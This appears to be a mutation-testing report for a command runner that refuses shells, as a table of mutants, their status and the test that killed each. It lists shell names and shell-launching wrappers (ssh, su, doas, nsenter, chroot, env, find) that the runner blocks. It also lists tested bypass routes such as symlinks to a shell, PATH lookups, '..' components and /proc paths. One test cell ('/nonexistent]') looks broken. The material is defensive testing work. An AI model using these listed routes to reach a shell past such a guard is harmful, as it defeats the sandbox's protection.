| A04 | metacharacters: first word only | KILLED | test_proof_metachar_is_a_policy_error_and_nothing_spawns |
| A05 | metacharacter scan removed | KILLED | test_proof_metachar_is_a_policy_error_and_nothing_spawns |
| A06 | metacharacter scan inverted | KILLED | test_proof_plain_string_runs_as_argv |
| A07 | split on whitespace only | KILLED | test_proof_plain_string_runs_as_argv |
| A08 | shlex comments on | KILLED | test_plain_strings_become_argv |
| A09 | shlex non-POSIX | KILLED | test_proof_plain_string_runs_as_argv |
| A10 | tokenize error not handled | KILLED | test_plain_strings_refused |
| R01 | empty argv allowed | KILLED | test_plain_strings_refused |
| R02 | argv count: > becomes >= | KILLED | test_argv_item_count_accepted |
| R03 | argv item length: > becomes >= | KILLED | test_plain_strings_become_argv |
| R04 | argv size caps removed | KILLED | test_argv_item_count_limit |
| R05 | NUL check removed | KILLED | test_plain_strings_refused |
| R06 | encode check removed | KILLED | test_argv_form_refused |
| R07 | encode check lets lone surrogates through | KILLED | test_argv_form_refused |
| R08 | empty executable allowed | KILLED | test_plain_strings_refused |
| R09 | leading dash allowed | KILLED | test_plain_strings_refused |
| R10 | '=' in the executable allowed | KILLED | test_plain_strings_refused |
| R11 | '=' checked on the last word | KILLED | test_plain_strings_become_argv |
| R12 | leading dash checked on every word | KILLED | test_proof_plain_string_runs_as_argv |
| R13 | '=' checked on every word | KILLED | test_plain_strings_become_argv |
| Q01 | shell flag ignored | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| Q02 | blank shell command allowed | KILLED | test_shell_gate_empty_command |
| Q03 | shell length: > becomes >= | KILLED | test_shell_gate_length_boundary |
| Q04 | shell length cap removed | KILLED | test_shell_gate_length_boundary |
| Q05 | shell runs without the caller flag | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| Q06 | shell caller flag inverted | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| Q07 | non-POSIX check inverted | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| Q08 | non-POSIX check removed | KILLED | test_shell_gate_is_refused_without_posix |
| Q09 | shell argv: -lc | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| Q10 | shell argv: bare sh | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| Q11 | guard sees the sh -c line | KILLED | test_guard_runs_on_the_joined_argv_and_is_called_once |
| Q12 | argv-form gates ignored | KILLED(rerun) | test_proof_timeout_is_timeout_never_pass |
| Q13 | refusal text not returned | KILLED | test_proof_metachar_is_a_policy_error_and_nothing_spawns |
| Q14 | empty argv replaced by `true` (a silent pass) | KILLED | test_plain_strings_refused |
| Q15 | guard sees a space-joined line | KILLED | test_argv_form_is_verbatim |
| Q16 | argv checks skipped | KILLED | test_plain_strings_refused |
| Q17 | cwd checked in write mode | KILLED | test_proof_plain_string_runs_as_argv |
| Q18 | cwd not fenced (Path only) | KILLED | test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd |
| Q19 | cwd joined to the root without containment | KILLED | test_cwd_outside_the_root_is_refused |
| Q20 | cwd denial not handled | KILLED | test_cwd_outside_the_root_is_refused |
| Q21 | cwd folder check removed | KILLED | test_a_refusal_never_echoes_the_command_or_cwd |
| Q22 | cwd folder check: exists | KILLED | test_cwd_must_be_an_existing_folder |
| R14 | argv refusal inverted | KILLED | test_proof_plain_string_runs_as_argv |
| Q22b | cwd folder check inverted | KILLED | test_proof_plain_string_runs_as_argv |
| Q25b | guard denial inverted | KILLED | test_proof_plain_string_runs_as_argv |
| Q31 | metacharacter refusal echoes the command | KILLED | test_a_refusal_never_echoes_the_command_or_cwd |
| Q32 | tokenize refusal echoes the command | KILLED | test_a_refusal_never_echoes_the_command_or_cwd |
| Q33 | leading-dash refusal echoes the word | KILLED | test_a_refusal_never_echoes_the_command_or_cwd |
| Q34 | cwd refusal echoes the cwd | KILLED | test_a_refusal_never_echoes_the_command_or_cwd |
| Q35 | cwd folder refusal echoes the cwd | KILLED | test_a_refusal_never_echoes_the_command_or_cwd |
| Q23 | guard not called | KILLED | test_huge_argv_is_refused_by_the_guard_cap |
| Q24 | guard not given the cwd (sensitive-path rule on cwd lost) | KILLED | test_guard_runs_on_the_joined_argv_and_is_called_once |
| Q24b | guard given the wrong command key | KILLED | test_huge_argv_is_refused_by_the_guard_cap |
| Q24c | guard given the gate cwd text, not the resolved path | KILLED | test_guard_runs_on_the_joined_argv_and_is_called_once |
| Q24d | guard fed the raw string for argv gates | KILLED | test_argv_form_is_verbatim |
| Q25 | guard denial replaced by a fixed word | KILLED | test_huge_argv_is_refused_by_the_guard_cap |
| Q26 | plan uses the root, not the gate cwd | KILLED | test_cwd_subfolder_is_honoured_by_the_child |
| Q27 | plan drops the first word | KILLED | test_proof_plain_string_runs_as_argv |
| Q28 | unexpected policy error not caught | KILLED | test_a_guard_crash_is_a_refusal_not_a_spawn |
| Q29 | unexpected policy error returns None | KILLED | test_a_guard_crash_is_a_refusal_not_a_spawn |
| Q30 | unexpected policy error is a pass-through plan | KILLED | test_a_guard_crash_is_a_refusal_not_a_spawn |
| E01 | env not scrubbed | KILLED | test_spawn_arguments |
| E02 | env scrub bypassed with an empty extra that restores the process env | KILLED | test_spawn_arguments |
| E03 | gate timeout ignored (budget cap lost) | KILLED(rerun) | test_total_budget_caps_the_running_gate_and_skips_the_rest |
| E04 | timeout x100 | KILLED(rerun) | test_proof_timeout_is_timeout_never_pass |
| E05 | no practical timeout | KILLED(rerun) | test_proof_timeout_is_timeout_never_pass |
| E06 | cwd not passed | KILLED | test_a_declared_shell_gate_still_runs_through_sh_when_allowed |
| E07 | cwd is the process folder | KILLED | test_a_declared_shell_gate_still_runs_through_sh_when_allowed |
| E08 | FileNotFoundError text lost | KILLED | test_missing_executable_is_an_error_not_a_pass |
| E09 | PermissionError text lost | KILLED | test_not_executable_is_an_error |
| E10 | other spawn errors escape | KILLED | test_unexpected_exception_while_collecting_is_an_error |
| E11 | KeyboardInterrupt swallowed | KILLED | test_keyboard_interrupt_is_not_swallowed |
| E12 | exception text in the message | KILLED | test_other_spawn_failures_are_errors_without_the_exception_text |
| E13 | timeout flag ignored | KILLED(rerun) | test_proof_timeout_is_timeout_never_pass |
| E14 | exit 0 outranks the timeout flag | KILLED | test_timeout_outranks_an_exit_code_of_zero |
| E15 | missing exit status not handled | KILLED | test_missing_exit_status_is_an_error |
| E16 | pass when exit <= 0 | KILLED | test_exit_code_mapping |
| E17 | pass when exit != 0 | KILLED | test_proof_plain_string_runs_as_argv |
| E18 | pass when exit is 0 or 1 | KILLED | test_exit_code_mapping |
| E19 | signal text on positive codes | KILLED | test_exit_code_mapping |
| E20 | failure status named error | KILLED | test_exit_code_mapping |
| E21 | timeout status named fail | KILLED(rerun) | test_proof_timeout_is_timeout_never_pass |
| E22 | pass status on a timeout | KILLED(rerun) | test_proof_timeout_is_timeout_never_pass |
| E23 | tails not redacted | KILLED | test_tails_are_redacted |
| E24 | head instead of tail | KILLED | test_the_tail_is_the_end_of_the_output |
| E25 | tail flag: > becomes >= | KILLED | test_tail_boundary |
| E26 | tail flag on the unredacted length | KILLED | test_the_capture_window_is_exactly_64000_bytes |
| E27 | cut before redaction | KILLED | test_redaction_happens_before_the_tail_is_cut |
| E28 | capture truncation flag ignored | KILLED | test_capture_truncation_counts_even_when_redaction_shrinks_the_text |
| E29 | stdout cut flag ignored | KILLED | test_redaction_happens_before_the_tail_is_cut |
| E30 | stderr cut flag ignored | KILLED | test_stderr_tail_is_cut_too |
| E31 | cut flags and-ed | KILLED | test_redaction_happens_before_the_tail_is_cut |
| E32 | stderr tail not redacted | KILLED | test_tails_are_redacted |
| E33 | stdout tail not redacted | KILLED | test_tails_are_redacted |
| E34 | negative duration | KILLED(rerun) | test_durations_are_small_non_negative_numbers |
| E35 | stdout and stderr swapped in the result | KILLED | test_proof_plain_string_runs_as_argv |
| E36 | exit code dropped | KILLED | test_exit_code_mapping |
| E37 | gate id replaced | KILLED | test_one_spawn_per_gate_in_declared_order |
| E38 | spawn failure reported as pass | KILLED | test_missing_executable_is_an_error_not_a_pass |
| E39 | not-executable reported as fail | KILLED | test_not_executable_is_an_error |
| E40 | generic spawn failure reported as pass | KILLED | test_other_spawn_failures_are_errors_without_the_exception_text |
| F01 | empty gate list allowed | KILLED | test_run_gates_refuses_an_empty_list |
| F34 | run_gates allows shell by default | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| F02 | shell always allowed | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| F03 | shell never allowed | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| F04 | refusal only when every gate is refused | KILLED | test_a_refused_gate_spawns_nothing_and_skips_every_gate |
| F05 | refusals never stop the run | KILLED | test_proof_metachar_is_a_policy_error_and_nothing_spawns |
| F06 | refused gate reported as error | KILLED | test_proof_metachar_is_a_policy_error_and_nothing_spawns |
| F07 | skipped gate reported as policy-error | KILLED | test_a_refused_gate_spawns_nothing_and_skips_every_gate |
| F08 | skipped gate reported as pass | KILLED | test_a_refused_gate_spawns_nothing_and_skips_every_gate |
| F09 | deadline in the past | KILLED | test_proof_plain_string_runs_as_argv |
| F10 | budget: <= becomes < | KILLED | test_total_budget_boundary_with_a_frozen_clock |
| F11 | budget: skips under one second left | KILLED(rerun) | test_total_budget_caps_the_running_gate_and_skips_the_rest |
| F12 | budget check removed | KILLED | test_total_budget_spent_means_not_run_never_pass |
| F13 | per-gate timeout: max | KILLED(rerun) | test_proof_timeout_is_timeout_never_pass |
| F14 | per-gate timeout: gate only | KILLED(rerun) | test_total_budget_caps_the_running_gate_and_skips_the_rest |
| F15 | per-gate timeout: remaining only | KILLED(rerun) | test_proof_timeout_is_timeout_never_pass |
| F16 | budget-skipped gate reported as pass | KILLED | test_total_budget_spent_means_not_run_never_pass |
| F17 | budget-skipped gates vanish (break) | KILLED | test_total_budget_spent_means_not_run_never_pass |
| F18 | fail-fast: stop at the first non-pass | KILLED | test_exit_code_mapping |
| F19 | gates run in reverse order | KILLED | test_one_spawn_per_gate_in_declared_order |
| F20 | gates run sorted by id | KILLED | test_a_silent_gate_with_exit_0_passes_and_a_noisy_failure_fails |
| F21 | duplicate ids collapse in the report | KILLED | test_duplicate_ids_never_swallow_a_gate |
| F22 | report order from a set | KILLED, x40 seeds | test_one_spawn_per_gate_in_declared_order |
| F23 | ok run reports exit 1 | KILLED | test_a_gate_file_is_not_a_c4_baseline |
| F24 | policy error maps to 1 | KILLED | test_proof_metachar_is_a_policy_error_and_nothing_spawns |
| F25 | everything non-ok maps to 2 | KILLED(rerun) | test_proof_timeout_is_timeout_never_pass |
| F26 | policy-error check on fail | KILLED | test_proof_metachar_is_a_policy_error_and_nothing_spawns |
| F27 | exit 0 whenever any gate passed | KILLED | test_every_gate_runs_after_a_failure |
| F28 | ok when any gate passed | KILLED | test_every_gate_runs_after_a_failure |
| F29 | ok when nothing failed (not-run counts as ok) | KILLED | test_total_budget_spent_means_not_run_never_pass |
| F30 | ok on an empty report | KILLED | test_status_to_exit_code |
| F31 | pass counted for not-run too | KILLED | test_a_refused_gate_spawns_nothing_and_skips_every_gate |
| F32 | failed count is total | KILLED | test_every_gate_runs_after_a_failure |
| F33 | report keeps only the first gate | KILLED | test_one_spawn_per_gate_in_declared_order |
| M01 | --allow-shell inverted | KILLED | test_cli_allow_shell_flag |
| M02 | shell always allowed from the CLI | KILLED | test_cli_allow_shell_flag |
| M03 | --root ignored | KILLED | test_the_real_cli_refuses_a_relative_link_to_a_shell_and_creates_nothing |
| M04 | default root is not the current folder | KILLED | test_the_real_cli_refuses_a_relative_link_to_a_shell_and_creates_nothing |
| M05 | root errors not handled as such | KILLED | test_cli_bad_root_exit_2 |
| M06 | unexpected errors escape | KILLED | test_unexpected_error_is_exit_2_and_never_echoes_the_text |
| M07 | gate-file error exits 1 | KILLED | test_bad_file_is_refused_and_exit_2 |
| M08 | unexpected error exits 1 | KILLED | test_unexpected_error_is_exit_2_and_never_echoes_the_text |
| M09 | unexpected error text echoed | KILLED | test_unexpected_error_is_exit_2_and_never_echoes_the_text |
| M10 | exit code is 0/1 only | KILLED | test_the_real_cli_refuses_a_relative_link_to_a_shell_and_creates_nothing |
| M11 | a lost report still returns the gate code | KILLED | test_a_lost_report_is_exit_2 |
| M12 | report kind renamed | KILLED | test_report_schema_and_key_order |
| M13 | report schema_version 2 | KILLED | test_a_gate_file_is_not_a_c4_baseline |
| M14 | report has C4 results key | KILLED | test_a_gate_file_is_not_a_c4_baseline |
| M15 | emit catches OSError only | KILLED | test_closed_stdout_is_exit_2 |
| M16 | emit reports success after a loss | KILLED | test_a_lost_report_is_exit_2 |
| M17 | emit does not flush | KILLED | test_a_lost_report_is_exit_2 |
| M18 | emit does not print | KILLED | test_bad_file_is_refused_and_exit_2 |
| M19 | lost stdout not parked (exit 120 at interpreter exit) | KILLED | test_full_disk_buffered_stdout_is_exit_2 |
| M23 | report JSON not ASCII-escaped | KILLED | test_non_ascii_output_survives_an_ascii_stdout |
| M20 | one positional gate file only (nargs *) | KILLED | test_bad_file_is_refused_and_exit_2 |
| M21 | gate file path ignored for a fixed name | KILLED | test_empty_gate_list_exit_2_nothing_runs |
| M22 | gates run before the root is checked (order) | SURVIVED | EQUIVALENT: the root is checked first or second: both failures print an exit-2 message, and no gate has run before either check |
| G01 | handlers never installed | KILLED | test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass |
| G02 | signal exits 0 | KILLED | test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass |
| G03 | signal exits 1 | KILLED | test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass |
| G04 | signal exits 128 | KILLED | test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass |
| G05 | signal exits with the bare signal number | KILLED | test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass |
| G06 | handlers not restored | KILLED | test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored |
| G07 | off-main-thread ValueError not handled | KILLED | test_the_handlers_are_left_alone_off_the_main_thread |
| G08 | SIGHUP not handled | KILLED | test_shell_names_and_wrappers_are_the_documented_lists |
| G08b | SIGTERM not handled | KILLED | test_shell_names_and_wrappers_are_the_documented_lists |
| G08c | SIGINT handled instead of SIGHUP | KILLED | test_shell_names_and_wrappers_are_the_documented_lists |
| G09 | handler raises KeyboardInterrupt | KILLED | test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass |
| G10 | run_gates outside the handlers' scope | KILLED | test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass |
| G11 | restore always to the default handler | KILLED | test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored |
| G12 | handler swallows the signal | KILLED | test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass |
| G13 | None (a C-installed handler) not guarded on restore | KILLED | test_a_handler_installed_from_c_is_restored_to_the_default |
| G14 | only the first handler restored | KILLED | test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored |
| T01 | relative path resolved against the runner's cwd | KILLED | test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd |
| T02 | PATH search resolved from the runner's cwd | KILLED | test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd |
| T02b | PATH entry not joined onto any cwd | KILLED | test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd |
| T03 | non-executable files found on PATH | KILLED | test_a_non_executable_file_on_path_is_skipped_like_the_child_does |
| T04 | directories and missing files found on PATH | KILLED | test_a_directory_of_the_same_name_on_path_is_skipped_like_the_child_does |
| T05 | PATH hit not walked before the file test (r48, r49: a hit that is a link into /proc) | KILLED | test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd |
| T05b | PATH hit returned unresolved (a link of any name to a shell is missed) | KILLED | test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd |
| T06 | PATH fixed instead of the process PATH | KILLED | test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd |
| T07 | path form not resolved through symlinks | KILLED | test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd |
| T08 | slash test only for absolute words | KILLED | test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd |
| T09 | empty PATH entries skipped | KILLED | test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd |
| T10 | relative PATH entries skipped | KILLED | test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd |
| T11 | only the first PATH entry searched | KILLED | /nonexistent] |
| T12 | gate cwd replaced by the runner cwd for the whole check | KILLED | test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd |
| T13 | last PATH hit instead of the first (the judge's K08) | KILLED | test_the_first_path_hit_wins_not_the_last |
| V08 | /proc not an opaque root | KILLED | test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder |
| V09 | /dev not an opaque root | KILLED | test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder |
| V10 | the root itself (/proc, /dev) not refused | KILLED | test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder |
| V12 | every link refused after the first (limit 0) | KILLED | test_proof_plain_string_runs_as_argv |
| V15 | refusal exception not caught | KILLED | test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder |
| V16 | refusal echoes the word | KILLED | test_the_proc_refusal_never_echoes_the_word |
| V25 | root prefix without the slash (QA Q25: /developer refused) | KILLED | test_the_root_names_are_matched_whole_so_a_sibling_folder_is_not_inside_them |
| W01 | dotdot check on the word removed | KILLED | test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder |
| W02 | dotdot check on a PATH entry removed | KILLED | test_dotdot_is_refused_in_a_path_entry_that_the_search_reaches_not_in_one_after_the_hit |
| W03 | dotdot only for the bare word .. | KILLED | test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder |
| W04 | dotdot checked AFTER normalisation (the D1 root cause) | KILLED | test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder |
| W05 | dotdot refusal echoes the path | KILLED | test_any_dotdot_component_in_the_executable_is_refused_before_any_normalisation |
| W06 | no component is checked against /proc and /dev | KILLED | test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder |
| W07 | links never examined | KILLED | test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd |
| W08 | link target not pushed onto the walk | KILLED | test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd |
| W09 | link target pushed in the wrong order | KILLED | test_plain_strings_become_argv |
| W10 | absolute target does not restart at / | KILLED | test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd |
| W11 | every target restarts at / (relative targets resolved from the root) | KILLED | test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd |
| W12 | the walk never advances | KILLED | test_proof_plain_string_runs_as_argv |
| W13 | OSError while resolving accepted (fail open) | KILLED | test_an_unreadable_link_or_any_os_error_while_resolving_is_a_refusal_not_a_pass |
| W14 | loop limit message missing (loop accepted as a plain refusal text) | KILLED | test_a_link_loop_is_refused_not_followed_forever |
| W15 | shell check on the lexical word only (resolution dropped) | KILLED | test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd |
| W16 | the '.' component not skipped | KILLED | test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder |
| W17 | a '..' from a link target is joined, not applied (the walk's own D1) | KILLED | test_matrix_every_row_is_refused_with_the_runner_in_another_folder |
| W18 | a '..' from a link target is ignored | KILLED | test_matrix_every_row_is_refused_with_the_runner_in_another_folder |
| W19 | a '..' from a link target goes to the root | KILLED | test_matrix_every_row_is_refused_with_the_runner_in_another_folder |
| W21 | the walk starts at // (a leading double slash is not seen as the root: QA Q26's form) | KILLED | test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder |
| W22 | an empty component (trailing slash, //) is not skipped: the resolved path keeps a trailing slash and its basename is empty | KILLED | test_matrix_every_row_is_refused_with_the_runner_in_another_folder |
| W20 | a '..' from a link target is applied to the path text (normpath), not the folder reached | SURVIVED | EQUIVALENT: the folder reached holds no link and no .., so normpath(join(cur, '..')) is dirname(cur): the same value |
| H01 | shell check never called | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H02 | shell check also applied to declared shell gates | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| H03 | shell check only on declared shell gates | KILLED | test_proof_shell_true_only_when_declared_and_allowed |
| H04 | name not lower-cased | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H05 | .exe not stripped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H06 | directory part not stripped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H07 | resolved path (realpath) ignored | KILLED | test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd |
| H08 | bare name not looked up on PATH | KILLED | test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd |
| H09 | path form not resolved | KILLED | test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd |
| H10 | lexical name ignored | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H11 | shell-running programs (su, watch) not refused | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H12 | wrappers never checked | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H13 | wrapper checks only the first argument | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H14 | wrapper refused without a shell argument | KILLED | test_ordinary_programs_are_not_mistaken_for_shells |
| H15 | wrapper argument compared without its basename | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H16 | any program is checked like a wrapper | KILLED | test_ordinary_programs_are_not_mistaken_for_shells |
| H17 | wrapper arguments compared case-sensitively | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H18 | refusal echoes the executable | KILLED | test_a_refusal_never_echoes_the_command_or_cwd |
| H19 | wrapper refusal echoes the arguments | KILLED | test_a_refusal_never_echoes_the_command_or_cwd |
| H20 | shell names matched by prefix | KILLED | test_ordinary_programs_are_not_mistaken_for_shells |
| H21 | python treated as a shell | KILLED | test_proof_plain_string_runs_as_argv |
| H22 | ssh-keygen treated as a shell (prefix of a name) | KILLED | test_ordinary_programs_are_not_mistaken_for_shells |
| H23 | refusal text drops the way out (--allow-shell) | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H3-ash | shell name ash dropped from the executable check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H4-ash | shell name ash dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-bash | shell name bash dropped from the executable check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H4-bash | shell name bash dropped from the wrapper argument check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H3-csh | shell name csh dropped from the executable check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H4-csh | shell name csh dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-dash | shell name dash dropped from the executable check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H4-dash | shell name dash dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-fish | shell name fish dropped from the executable check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H4-fish | shell name fish dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-ksh | shell name ksh dropped from the executable check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H4-ksh | shell name ksh dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-mksh | shell name mksh dropped from the executable check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H4-mksh | shell name mksh dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-pdksh | shell name pdksh dropped from the executable check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H4-pdksh | shell name pdksh dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-posh | shell name posh dropped from the executable check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H4-posh | shell name posh dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-rbash | shell name rbash dropped from the executable check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H4-rbash | shell name rbash dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-sh | shell name sh dropped from the executable check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H4-sh | shell name sh dropped from the wrapper argument check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H3-tcsh | shell name tcsh dropped from the executable check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H4-tcsh | shell name tcsh dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-yash | shell name yash dropped from the executable check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H4-yash | shell name yash dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H3-zsh | shell name zsh dropped from the executable check | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H4-zsh | shell name zsh dropped from the wrapper argument check | KILLED | test_every_listed_shell_is_refused_as_the_executable_and_behind_a_wrapper |
| H5-su | su dropped from SHELL_RUNNERS | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H5-watch | watch dropped from SHELL_RUNNERS | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-builtin | wrapper builtin dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-busybox | wrapper busybox dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-chroot | wrapper chroot dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-chrt | wrapper chrt dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-command | wrapper command dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-doas | wrapper doas dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-env | wrapper env dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-exec | wrapper exec dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-find | wrapper find dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-flock | wrapper flock dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-ionice | wrapper ionice dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-nice | wrapper nice dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-nohup | wrapper nohup dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-nsenter | wrapper nsenter dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-parallel | wrapper parallel dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-runuser | wrapper runuser dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-script | wrapper script dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-setpriv | wrapper setpriv dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-setsid | wrapper setsid dropped | KILLED | test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate |
| H6-ssh | wrapper ssh dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-stdbuf | wrapper stdbuf dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
| H6-strace | wrapper strace dropped | KILLED | test_every_listed_wrapper_is_refused_when_handed_a_shell_and_allowed_otherwise |
